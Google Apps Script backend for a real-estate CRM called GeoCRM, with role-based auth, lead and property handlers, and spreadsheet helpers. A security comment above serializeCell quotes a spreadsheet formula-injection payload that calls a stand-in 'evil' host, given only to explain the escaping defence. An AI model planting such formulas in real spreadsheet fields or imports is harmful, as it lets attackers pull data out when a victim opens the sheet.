/**
 * ==========================================================================
 * GeoCRM — Google Apps Script backend (Google Sheets as the database)
 * ==========================================================================
 *
 * This is the server that geocrm.html talks to. Deploy it as a Web App and
 * paste the resulting /exec URL into GAS_WEB_APP_URL at the top of the
 * <script> block in geocrm.html.
 *
 * The frontend POSTs a JSON body of the shape { method: "<name>", args: [...] }
 * as text/plain (no custom headers) so the browser does NOT fire a CORS
 * preflight — Apps Script Web Apps do not answer OPTIONS requests.
 *
 * See geocrm-setup.md for step-by-step deployment instructions.
 */

// If you leave this blank the script uses the spreadsheet it is bound to
// (Extensions ▸ Apps Script from inside a Sheet). To point at a standalone
// spreadsheet instead, paste its ID here (the long token in the sheet URL).
var SPREADSHEET_ID = '';

var SHEETS = {
  Leads:      ['LeadID', 'Name', 'Phone', 'Requirement', 'Status', 'Agent', 'Source', 'Priority', 'Remarks', 'Docs', 'CreatedAt', 'Email', 'Trashed', 'TrashedBy', 'TrashedAt', 'History'],
  Properties: ['PropertyID', 'Title', 'Type', 'Price', 'Address', 'Lat', 'Lng', 'Status', 'Image', 'AssignedTo', 'Remarks'],
  Tasks:      ['TaskID', 'LeadName', 'Agent', 'TaskType', 'Date', 'Status'],
  Users:      ['Email', 'Name', 'Salt', 'PasswordHash', 'Role', 'CreatedAt', 'Token']
};

// Methods callable WITHOUT a session token. Everything else requires the
// caller to present the token issued by login/signup.
var PUBLIC_METHODS = { login: true, signup: true };

// Methods additionally restricted to callers whose Role is Admin.
// This is enforced server-side in doPost — an Agent's token is not enough.
// Note: assignLeadsBulk is NOT here — CRM may also reassign leads in bulk.
var ADMIN_METHODS = { getUsers: true, addUser: true, updateUserRole: true, deleteUser: true, addLeadsBulk: true, addPropertiesBulk: true, deleteLeadsNoContact: true, purgeLead: true, purgeAllTrash: true };

// Roles a user can hold:
//   Admin  - full access to everything.
//   Agent  - sees and manages only their own assigned leads/tasks.
//   CRM    - sees ALL leads/properties/tasks and fully manages leads
//            (edit every field, reassign to any employee, move to Trash,
//            restore) plus property notes. Cannot touch properties/tasks/
//            team/import — those stay Admin-only.
//   Viewer - "View Manager": sees ALL leads/properties/tasks but cannot
//            write anything at all, not even a remark.
var VALID_ROLES = { Admin: true, Agent: true, CRM: true, Viewer: true };

var CRM_METHODS = {
  getLeads: true, getProperties: true, getFollowUps: true, getAgents: true,
  addRemark: true, addPropertyRemark: true,
  addLead: true, updateLead: true, updateLeadStatus: true,
  trashLead: true, restoreLead: true, assignLeadsBulk: true
};

var VIEWER_METHODS = { getLeads: true, getProperties: true, getFollowUps: true, getAgents: true };

// The authenticated user for the current request (set in doPost).
var CURRENT_CALLER = null;

/**
 * -------------------------- HTTP entry points --------------------------
 */
function doPost(e) {
  try {
    var body = JSON.parse(e.postData.contents);
    var method = body.method;
    var args = body.args || [];

    // logout is special-cased: it acts on the token itself.
    if (method === 'logout') {
      if (body.token) clearToken(body.token);
      return json({ success: true });
    }

    var handler = HANDLERS[method];
    if (!handler) return json({ error: 'Unknown method: ' + method });

    if (!PUBLIC_METHODS[method]) {
      var caller = findUserByToken(body.token);
      if (!caller) return json({ error: 'Unauthorized' });
      CURRENT_CALLER = caller;
      if (ADMIN_METHODS[method] && caller.Role !== 'Admin') {
        return json({ error: 'Admin access required' });
      }
      if (caller.Role === 'CRM' && !CRM_METHODS[method]) {
        return json({ error: 'CRM role cannot perform this action' });
      }
      if (caller.Role === 'Viewer' && !VIEWER_METHODS[method]) {
        return json({ error: 'View Manager is read-only' });
      }
    }

    return json(handler.apply(null, args));
  } catch (err) {
    return json({ error: String(err && err.message ? err.message : err) });
  }
}

// A GET is handy for a quick "is it alive?" check in the browser.
function doGet() {
  return json({ ok: true, service: 'GeoCRM', sheets: Object.keys(SHEETS) });
}

function json(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}

/**
 * ----------------------------- Handlers -------------------------------
 */
var HANDLERS = {
  /**
   * Server-side auth against the Users sheet. Passwords are stored as
   * salted SHA-256 hashes — never plaintext. The very first account to
   * sign up becomes Admin; everyone after that is an Agent (an Admin can
   * promote them by editing the Role cell in the Users sheet).
   */
  login: function (email, password) {
    if (!email || !password) return { success: false, error: 'Email and password are required' };
    var user = findUser(email);
    if (!user) return { success: false, error: 'Invalid email or password' };
    if (hashPassword(password, user.Salt) !== String(user.PasswordHash)) {
      return { success: false, error: 'Invalid email or password' };
    }
    var token = newToken();
    updateRow('Users', 'Email', user.Email, { Token: token });
    return { success: true, user: { name: user.Name, email: user.Email, role: user.Role || 'Agent', token: token } };
  },

  /**
   * Public sign-up only bootstraps the very first account (the Admin).
   * After that it is locked: the Admin adds every team member via addUser,
   * so strangers who find the URL cannot create accounts.
   */
  signup: function (name, email, password) {
    if (!email || !password) return { success: false, error: 'Email and password are required' };
    if (String(password).length < 4) return { success: false, error: 'Password must be at least 4 characters' };

    if (readSheet('Users').length > 0) {
      return { success: false, error: 'Sign-up is disabled. Ask your Admin to add you as a team member.' };
    }

    var user = {
      Email: String(email).toLowerCase(),
      Name: name || String(email).split('@')[0],
      Salt: Utilities.getUuid(),
      Role: 'Admin',
      CreatedAt: new Date().toISOString(),
      Token: newToken()
    };
    user.PasswordHash = hashPassword(password, user.Salt);
    appendRow('Users', user);
    return { success: true, user: { name: user.Name, email: user.Email, role: user.Role, token: user.Token } };
  },

  /**
   * ---- Team management (Admin only — enforced in doPost) ----
   */
  getUsers: function () {
    return readSheet('Users').map(function (u) {
      return { email: u.Email, name: u.Name, role: u.Role || 'Agent', createdAt: u.CreatedAt };
    });
  },

  addUser: function (name, email, password, role) {
    if (!name || !email || !password) return { success: false, error: 'Name, email and password are required' };
    if (String(password).length < 4) return { success: false, error: 'Password must be at least 4 characters' };
    if (findUser(email)) return { success: false, error: 'A member with this email already exists' };
    if (!VALID_ROLES[role]) role = 'Agent';

    var user = {
      Email: String(email).toLowerCase(),
      Name: name,
      Salt: Utilities.getUuid(),
      Role: role,
      CreatedAt: new Date().toISOString(),
      Token: '' // they get a token when they log in themselves
    };
    user.PasswordHash = hashPassword(password, user.Salt);
    appendRow('Users', user);
    return { success: true };
  },

  updateUserRole: function (email, role) {
    if (!VALID_ROLES[role]) return { success: false, error: 'Invalid role' };
    if (CURRENT_CALLER && String(CURRENT_CALLER.Email).toLowerCase() === String(email).toLowerCase()) {
      return { success: false, error: 'You cannot change your own role' };
    }
    var user = findUser(email);
    if (!user) return { success: false, error: 'Member not found' };
    updateRow('Users', 'Email', user.Email, { Role: role });
    return { success: true };
  },

  deleteUser: function (email) {
    if (CURRENT_CALLER && String(CURRENT_CALLER.Email).toLowerCase() === String(email).toLowerCase()) {
      return { success: false, error: 'You cannot remove your own account' };
    }
    var user = findUser(email);
    if (!user) return { success: false, error: 'Member not found' };
    deleteRow('Users', 'Email', user.Email);
    return { success: true };
  },

  // Names + roles only (for the "assign to agent" dropdown) — no credentials leave the server.
  getAgents: function () {
    return readSheet('Users').map(function (u) {
      return { name: u.Name, role: u.Role || 'Agent' };
    });
  },

  getLeads: function () {
    return readSheet('Leads');
  },

  getProperties: function () {
    return readSheet('Properties');
  },

  getFollowUps: function () {
    return readSheet('Tasks');
  },

  addLead: function (lead) {
    lead = lead || {};
    if (!lead.CreatedAt) lead.CreatedAt = new Date().toISOString();
    appendRow('Leads', lead);
    return { success: true, id: lead.LeadID };
  },

  // Full edit: any user may call this (Agent/CRM/Admin — Viewer is blocked
  // earlier by VIEWER_METHODS), but an Agent may only touch their OWN leads.
  //
  // History is computed CLIENT-SIDE (same pattern as Remarks: the client
  // builds the entry and this just persists it) rather than diffed here.
  // That is deliberate: the client is the one place that reliably has both
  // the "before" and "after" values, it works identically in offline demo
  // mode (no server round-trip at all), and it avoids two independent diffs
  // (client's optimistic one + a server recompute) ever disagreeing. The
  // server still stamps who/when authoritatively below, so a caller cannot
  // spoof another user's name in the audit log.
  updateLead: function (lead) {
    var current = findRow('Leads', 'LeadID', lead.LeadID);
    if (!current) return { error: 'Lead not found: ' + lead.LeadID };
    if (!canManageLead(current)) return { error: 'You can only manage your own leads' };

    var patch = {};
    for (var k in lead) { if (lead.hasOwnProperty(k)) patch[k] = lead[k]; }

    var by = CURRENT_CALLER ? CURRENT_CALLER.Name : 'Unknown';
    var now = new Date().toISOString();
    var newEntries = Array.isArray(lead.History) ? lead.History : parseJsonArray(lead.History);
    var priorEntries = parseJsonArray(current.History);
    // Only the entries the client added THIS call get stamped and appended —
    // anything at or before priorEntries.length was already persisted.
    var appended = newEntries.slice(priorEntries.length).map(function (e) {
      return { field: e.field, from: e.from, to: e.to, by: by, at: now };
    });
    patch.History = JSON.stringify(priorEntries.concat(appended));

    updateRow('Leads', 'LeadID', lead.LeadID, patch);
    return { success: true };
  },

  updateLeadStatus: function (leadId, status) {
    var current = findRow('Leads', 'LeadID', leadId);
    if (!current) return { error: 'Lead not found: ' + leadId };
    if (!canManageLead(current)) return { error: 'You can only manage your own leads' };
    if (String(current.Status || '') === String(status || '')) return { success: true };

    var history = parseJsonArray(current.History);
    history.push({ field: 'Status', from: current.Status || '', to: status, by: CURRENT_CALLER ? CURRENT_CALLER.Name : 'Unknown', at: new Date().toISOString() });
    updateRow('Leads', 'LeadID', leadId, { Status: status, History: JSON.stringify(history) });
    return { success: true };
  },

  // Soft delete: moves a lead into the Trash view instead of erasing it.
  // Admin and CRM may trash any lead; an Agent only their own.
  trashLead: function (leadId) {
    var current = findRow('Leads', 'LeadID', leadId);
    if (!current) return { error: 'Lead not found: ' + leadId };
    if (!canManageLead(current)) return { error: 'You can only manage your own leads' };

    var by = CURRENT_CALLER ? CURRENT_CALLER.Name : 'Unknown';
    var now = new Date().toISOString();
    var history = parseJsonArray(current.History);
    history.push({ field: 'Trashed', from: '', to: 'true', by: by, at: now });
    updateRow('Leads', 'LeadID', leadId, { Trashed: 'true', TrashedBy: by, TrashedAt: now, History: JSON.stringify(history) });
    return { success: true };
  },

  restoreLead: function (leadId) {
    var current = findRow('Leads', 'LeadID', leadId);
    if (!current) return { error: 'Lead not found: ' + leadId };
    if (!canManageLead(current)) return { error: 'You can only manage your own leads' };

    var history = parseJsonArray(current.History);
    history.push({ field: 'Trashed', from: 'true', to: '', by: CURRENT_CALLER ? CURRENT_CALLER.Name : 'Unknown', at: new Date().toISOString() });
    updateRow('Leads', 'LeadID', leadId, { Trashed: '', TrashedBy: '', TrashedAt: '', History: JSON.stringify(history) });
    return { success: true };
  },

  // Permanent removal — Admin only (see ADMIN_METHODS).
  purgeLead: function (leadId) {
    deleteRow('Leads', 'LeadID', leadId);
    return { success: true };
  },

  // Permanently remove every trashed lead in one pass — Admin only.
  purgeAllTrash: function () {
    var sheet = getSheet('Leads');
    var values = sheet.getDataRange().getValues();
    if (values.length < 2) return { success: true, removed: 0 };
    var headers = values[0].map(function (h) { return String(h).trim(); });
    var trashCol = headers.indexOf('Trashed');
    if (trashCol === -1) return { success: true, removed: 0 };

    var keep = [values[0]];
    var removed = 0;
    for (var r = 1; r < values.length; r++) {
      var row = values[r];
      if (row.join('') === '') continue;
      if (String(row[trashCol]) === 'true') removed++; else keep.push(row);
    }
    if (removed > 0) {
      sheet.clearContents();
      sheet.getRange(1, 1, keep.length, keep[0].length).setValues(keep);
    }
    return { success: true, removed: removed };
  },

  addRemark: function (leadId, remark) {
    var lead = findRow('Leads', 'LeadID', leadId);
    if (!lead) return { error: 'Lead not found: ' + leadId };
    if (!canManageLead(lead)) return { error: 'You can only manage your own leads' };
    var remarks = parseJsonArray(lead.Remarks);
    remarks.push(remark);
    updateRow('Leads', 'LeadID', leadId, { Remarks: JSON.stringify(remarks) });
    return { success: true, remarks: remarks };
  },

  addPropertyRemark: function (propId, remark) {
    var prop = findRow('Properties', 'PropertyID', propId);
    if (!prop) return { error: 'Property not found: ' + propId };
    var remarks = parseJsonArray(prop.Remarks);
    remarks.push(remark);
    updateRow('Properties', 'PropertyID', propId, { Remarks: JSON.stringify(remarks) });
    return { success: true, remarks: remarks };
  },

  // Properties aren't covered by any role whitelist (CRM/Viewer are already
  // blocked from these three methods entirely), so an Agent previously had
  // no server-side limit at all — they could edit or delete ANY property via
  // a direct API call, not just ones assigned to them. canManageProperty()
  // closes that the same way canManageLead() does for leads.
  addProperty: function (prop) {
    prop = prop || {};
    if (CURRENT_CALLER && CURRENT_CALLER.Role !== 'Admin') {
      prop.AssignedTo = [CURRENT_CALLER.Name]; // Agents can only assign a new property to themselves
    }
    appendRow('Properties', prop);
    return { success: true, id: prop.PropertyID };
  },

  updateProperty: function (prop) {
    var current = findRow('Properties', 'PropertyID', prop.PropertyID);
    if (!current) return { error: 'Property not found: ' + prop.PropertyID };
    if (!canManageProperty(current)) return { error: 'You can only manage properties assigned to you' };

    var patch = {};
    for (var k in prop) { if (prop.hasOwnProperty(k)) patch[k] = prop[k]; }
    if (CURRENT_CALLER.Role !== 'Admin') {
      patch.AssignedTo = current.AssignedTo; // only Admin may change who a property is assigned to
    }
    updateRow('Properties', 'PropertyID', prop.PropertyID, patch);
    return { success: true };
  },

  deleteProperty: function (propId) {
    var current = findRow('Properties', 'PropertyID', propId);
    if (!current) return { error: 'Property not found: ' + propId };
    if (!canManageProperty(current)) return { error: 'You can only manage properties assigned to you' };
    deleteRow('Properties', 'PropertyID', propId);
    return { success: true };
  },

  // ---- Bulk import (Admin only — enforced in doPost) ----
  // One setValues() call instead of a row-by-row loop: importing thousands
  // of rows completes in seconds instead of minutes.
  addLeadsBulk: function (leadList) {
    leadList = leadList || [];
    if (!leadList.length) return { success: true, count: 0 };
    var now = new Date().toISOString();
    leadList.forEach(function (l) { if (!l.CreatedAt) l.CreatedAt = now; });
    appendRowsBatch('Leads', leadList);
    return { success: true, count: leadList.length };
  },

  addPropertiesBulk: function (propList) {
    propList = propList || [];
    if (!propList.length) return { success: true, count: 0 };
    appendRowsBatch('Properties', propList);
    return { success: true, count: propList.length };
  },

  // Assign many leads to one agent in a single Agent-column write.
  // Available to Admin and CRM (the roles that manage the whole pipeline) —
  // CRM_METHODS whitelists this for CRM; it is not in ADMIN_METHODS.
  // Each reassignment is also logged to the lead's History.
  assignLeadsBulk: function (leadIds, agentName) {
    leadIds = leadIds || [];
    if (!leadIds.length || !agentName) return { success: true, updated: 0 };
    var idSet = {};
    leadIds.forEach(function (id) { idSet[String(id)] = true; });

    var sheet = getSheet('Leads');
    var values = sheet.getDataRange().getValues();
    if (values.length < 2) return { success: true, updated: 0 };
    var headers = values[0].map(function (h) { return String(h).trim(); });
    var idCol = headers.indexOf('LeadID');
    var agentCol = headers.indexOf('Agent');
    var historyCol = headers.indexOf('History');
    if (idCol === -1 || agentCol === -1) return { error: 'LeadID/Agent column missing' };

    var by = CURRENT_CALLER ? CURRENT_CALLER.Name : 'Unknown';
    var now = new Date().toISOString();
    var agentVals = [];
    var historyVals = [];
    var updated = 0;
    for (var r = 1; r < values.length; r++) {
      var row = values[r];
      var agentVal = row[agentCol];
      var historyVal = historyCol > -1 ? row[historyCol] : '';
      if (idSet[String(row[idCol])] && String(agentVal || '') !== String(agentName)) {
        var history = parseJsonArray(historyVal);
        history.push({ field: 'Agent', from: agentVal || '', to: agentName, by: by, at: now });
        historyVal = JSON.stringify(history);
        agentVal = agentName;
        updated++;
      }
      agentVals.push([agentVal]);
      historyVals.push([historyVal]);
    }
    if (updated > 0) {
      sheet.getRange(2, agentCol + 1, agentVals.length, 1).setValues(agentVals);
      if (historyCol > -1) sheet.getRange(2, historyCol + 1, historyVals.length, 1).setValues(historyVals);
    }
    return { success: true, updated: updated };
  },

  // Removes every lead that has neither a phone number (≥7 digits) nor an
  // email address, rewriting the sheet in a single pass — safe at 100k rows.
  deleteLeadsNoContact: function () {
    var sheet = getSheet('Leads');
    var values = sheet.getDataRange().getValues();
    if (values.length < 2) return { success: true, removed: 0 };
    var headers = values[0].map(function (h) { return String(h).trim(); });
    var phoneCol = headers.indexOf('Phone');
    var emailCol = headers.indexOf('Email');

    var keep = [values[0]];
    var removed = 0;
    for (var r = 1; r < values.length; r++) {
      var row = values[r];
      if (row.join('') === '') continue;
      var phone = String(phoneCol > -1 ? row[phoneCol] : '').replace(/\D/g, '');
      var email = String(emailCol > -1 ? row[emailCol] : '').trim();
      var hasContact = phone.length >= 7 || email.indexOf('@') > 0;
      if (hasContact) keep.push(row); else removed++;
    }
    if (removed > 0) {
      sheet.clearContents();
      sheet.getRange(1, 1, keep.length, keep[0].length).setValues(keep);
    }
    return { success: true, removed: removed };
  },

  addTask: function (task) {
    task = task || {};
    if (CURRENT_CALLER && CURRENT_CALLER.Role !== 'Admin') {
      task.Agent = CURRENT_CALLER.Name; // a task always belongs to whoever created it, unless Admin
    }
    appendRow('Tasks', task);
    return { success: true, id: task.TaskID };
  },

  updateTask: function (taskId, patch) {
    var current = findRow('Tasks', 'TaskID', taskId);
    if (!current) return { error: 'Task not found: ' + taskId };
    if (CURRENT_CALLER && CURRENT_CALLER.Role !== 'Admin' && !sameNameServer(current.Agent, CURRENT_CALLER.Name)) {
      return { error: 'You can only manage your own tasks' };
    }
    updateRow('Tasks', 'TaskID', taskId, patch);
    return { success: true };
  }
};

/**
 * ---------------------- Spreadsheet helpers ---------------------------
 */
function getSpreadsheet() {
  if (SPREADSHEET_ID) return SpreadsheetApp.openById(SPREADSHEET_ID);
  var active = SpreadsheetApp.getActiveSpreadsheet();
  if (!active) throw new Error('No bound spreadsheet — set SPREADSHEET_ID at the top of Code.gs.');
  return active;
}

// Returns the sheet, creating it (with headers) if missing.
function getSheet(name) {
  var ss = getSpreadsheet();
  var sheet = ss.getSheetByName(name);
  if (!sheet) {
    sheet = ss.insertSheet(name);
    var headers = SHEETS[name];
    if (headers) sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
  }
  return sheet;
}

function headerRow(sheet) {
  var lastCol = sheet.getLastColumn();
  if (lastCol === 0) return [];
  return sheet.getRange(1, 1, 1, lastCol).getValues()[0].map(function (h) { return String(h).trim(); });
}

// Reads a whole sheet into an array of plain objects keyed by header name.
function readSheet(name) {
  var ss = getSpreadsheet();
  var sheet = ss.getSheetByName(name);
  if (!sheet) return [];
  var values = sheet.getDataRange().getValues();
  if (values.length < 2) return [];
  var headers = values[0].map(function (h) { return String(h).trim(); });
  var out = [];
  for (var r = 1; r < values.length; r++) {
    var row = values[r];
    if (row.join('') === '') continue; // skip blank rows
    var obj = {};
    for (var c = 0; c < headers.length; c++) {
      if (!headers[c]) continue;
      obj[headers[c]] = normalizeCell(headers[c], row[c]);
    }
    out.push(obj);
  }
  return out;
}

// Remarks/Docs/AssignedTo are stored as JSON text; hand them back parsed.
function normalizeCell(header, value) {
  if (header === 'Remarks' || header === 'Docs' || header === 'AssignedTo' || header === 'History') return parseJsonArray(value);
  if (value instanceof Date) return value.toISOString();
  return value;
}

function parseJsonArray(value) {
  if (Array.isArray(value)) return value;
  if (value === '' || value === null || value === undefined) return [];
  try {
    var parsed = JSON.parse(value);
    return Array.isArray(parsed) ? parsed : [];
  } catch (e) {
    return [];
  }
}

function appendRow(name, obj) {
  var sheet = getSheet(name);
  var headers = headerRow(sheet);
  if (headers.length === 0) {
    headers = SHEETS[name];
    sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
  }
  var row = headers.map(function (h) { return serializeCell(obj[h]); });
  sheet.appendRow(row);
}

// Append many objects in ONE setValues call (bulk import fast path).
function appendRowsBatch(name, objs) {
  var sheet = getSheet(name);
  var headers = headerRow(sheet);
  if (headers.length === 0) {
    headers = SHEETS[name];
    sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
  }
  var rows = objs.map(function (o) {
    return headers.map(function (h) { return serializeCell(o[h]); });
  });
  sheet.getRange(sheet.getLastRow() + 1, 1, rows.length, headers.length).setValues(rows);
}

function updateRow(name, keyField, keyValue, patch) {
  var sheet = getSheet(name);
  var values = sheet.getDataRange().getValues();
  var headers = values[0].map(function (h) { return String(h).trim(); });
  var keyCol = headers.indexOf(keyField);
  if (keyCol === -1) throw new Error('Key column not found: ' + keyField);

  for (var r = 1; r < values.length; r++) {
    if (String(values[r][keyCol]) === String(keyValue)) {
      for (var c = 0; c < headers.length; c++) {
        if (patch.hasOwnProperty(headers[c])) {
          sheet.getRange(r + 1, c + 1).setValue(serializeCell(patch[headers[c]]));
        }
      }
      return true;
    }
  }
  return false;
}

function deleteRow(name, keyField, keyValue) {
  var sheet = getSheet(name);
  var values = sheet.getDataRange().getValues();
  var headers = values[0].map(function (h) { return String(h).trim(); });
  var keyCol = headers.indexOf(keyField);
  if (keyCol === -1) throw new Error('Key column not found: ' + keyField);

  for (var r = values.length - 1; r >= 1; r--) {
    if (String(values[r][keyCol]) === String(keyValue)) {
      sheet.deleteRow(r + 1);
      return true;
    }
  }
  return false;
}

function findRow(name, keyField, keyValue) {
  var rows = readSheet(name);
  for (var i = 0; i < rows.length; i++) {
    if (String(rows[i][keyField]) === String(keyValue)) return rows[i];
  }
  return null;
}

/**
 * ------------------------------ Auth helpers --------------------------
 */
function findUser(email) {
  var rows = readSheet('Users');
  var needle = String(email).toLowerCase();
  for (var i = 0; i < rows.length; i++) {
    if (String(rows[i].Email).toLowerCase() === needle) return rows[i];
  }
  return null;
}

// Trimmed, case-insensitive name compare — mirrors the frontend's sameName()
// so a stray space/capitalization never causes a mismatch between them.
function sameNameServer(a, b) {
  return String(a || '').trim().toLowerCase() === String(b || '').trim().toLowerCase();
}

// Admin and CRM manage every lead; an Agent may only manage leads currently
// assigned to them. Called from every lead-mutating handler so ownership is
// enforced even against a hand-crafted API request, not just the UI.
function canManageLead(lead) {
  if (!CURRENT_CALLER) return false;
  if (CURRENT_CALLER.Role === 'Admin' || CURRENT_CALLER.Role === 'CRM') return true;
  return sameNameServer(lead.Agent, CURRENT_CALLER.Name);
}

// Admin manages every property. An Agent may only manage properties
// currently assigned to them (CRM/Viewer never reach here — they're
// blocked from every property-mutating method by their whitelists).
function canManageProperty(prop) {
  if (!CURRENT_CALLER) return false;
  if (CURRENT_CALLER.Role === 'Admin') return true;
  var assigned = parseJsonArray(prop.AssignedTo);
  return assigned.some(function (n) { return sameNameServer(n, CURRENT_CALLER.Name); });
}

// Opaque random session token, issued at login/signup, stored on the user's
// row. One active session per user: a new login replaces the old token.
function newToken() {
  return Utilities.getUuid() + '-' + Utilities.getUuid();
}

function findUserByToken(token) {
  if (!token) return null;
  var rows = readSheet('Users');
  for (var i = 0; i < rows.length; i++) {
    if (rows[i].Token && String(rows[i].Token) === String(token)) return rows[i];
  }
  return null;
}

function clearToken(token) {
  var user = findUserByToken(token);
  if (user) updateRow('Users', 'Email', user.Email, { Token: '' });
}

// Salted SHA-256, hex-encoded. Not bcrypt-grade, but the strongest primitive
// Apps Script offers natively — and far better than the plaintext it replaces.
function hashPassword(password, salt) {
  var digest = Utilities.computeDigest(
    Utilities.DigestAlgorithm.SHA_256,
    String(salt) + ':' + String(password),
    Utilities.Charset.UTF_8
  );
  return digest.map(function (b) {
    var v = (b < 0 ? b + 256 : b).toString(16);
    return v.length === 1 ? '0' + v : v;
  }).join('');
}

// Objects/arrays are stored as JSON text so a single cell can hold them.
//
// SECURITY: Google Sheets treats a cell value beginning with =, +, -, or @
// as a FORMULA, not literal text — including values written via the API,
// not just typed by hand. Every write (leads, properties, tasks, remarks,
// history, imported rows) ultimately passes through here, so this is the
// one place that has to neutralize that: prefixing with a leading
// apostrophe is Sheets' own "force literal text" convention and stops a
// value like =IMPORTXML("https://evil/","//a") — submitted through any
// free-text field by any authenticated user, or via Excel import — from
// becoming a live, executing formula the moment an Admin opens the sheet.
function serializeCell(value) {
  if (value === null || value === undefined) return '';
  if (typeof value === 'object') return JSON.stringify(value);
  // Only strings can be mistaken for formulas — a real number (e.g. a
  // negative longitude like -74.006) must stay a number, not become text.
  if (typeof value === 'string' && /^[=+\-@]/.test(value)) return "'" + value;
  return value;
}

/**
 * ------------------------------ Setup ---------------------------------
 * Run this ONCE from the Apps Script editor to create the sheets, headers,
 * and a few demo rows so the CRM has something to show on first load.
 */
function setupSheets() {
  Object.keys(SHEETS).forEach(function (name) {
    var sheet = getSheet(name);
    var headers = SHEETS[name];
    sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
  });

  if (readSheet('Leads').length === 0) {
    ['L-001,Rahul Sharma,+91 98765 43210,3BHK New Town,New,Kaustabh,99acres,Hot',
     'L-002,Priya Patel,+91 98765 12345,2BHK Apartment,Contacted,Admin,Referral,Warm']
      .forEach(function (line) {
        var f = line.split(',');
        HANDLERS.addLead({
          LeadID: f[0], Name: f[1], Phone: f[2], Requirement: f[3], Status: f[4],
          Agent: f[5], Source: f[6], Priority: f[7], Remarks: [], Docs: []
        });
      });
  }

  if (readSheet('Properties').length === 0) {
    HANDLERS.addProperty({
      PropertyID: 'P-101', Title: 'Rajarhat Premium 3BHK', Type: 'Apartment', Price: '8500000',
      Address: 'Action Area I, Rajarhat', Lat: 22.5855, Lng: 88.4616, Status: 'Available', Image: ''
    });
  }
}
